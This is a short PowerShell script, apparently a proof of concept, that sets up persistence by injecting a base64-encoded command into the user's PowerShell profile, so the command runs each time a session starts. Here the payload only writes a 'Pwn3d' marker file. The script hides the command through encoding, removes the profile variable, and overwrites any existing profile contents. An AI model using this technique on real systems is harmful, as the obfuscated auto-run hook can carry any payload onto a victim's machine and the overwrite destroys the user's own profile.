# payload
$code = "Set-Content -Path 'C:\Users\Public\Documents\pwned.txt' -Value 'Pwn3d' -Encoding UTF8"

# encode payload with base64 
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($code))

# create powershell profile if not existing and inject payload
if (-not (Test-Path $PROFILE)) {
    New-Item -ItemType Directory -Path (Split-Path $PROFILE) -Force
    echo "Remove-Variable -Name profile -ErrorAction SilentlyContinue" > $PROFILE
    echo "powershell -NoProfile -Enc $encoded" >> $PROFILE
} else {
    echo "Remove-Variable -Name profile -ErrorAction SilentlyContinue" > $PROFILE
    echo "powershell -NoProfile -Enc $encoded" >> $PROFILE
    
}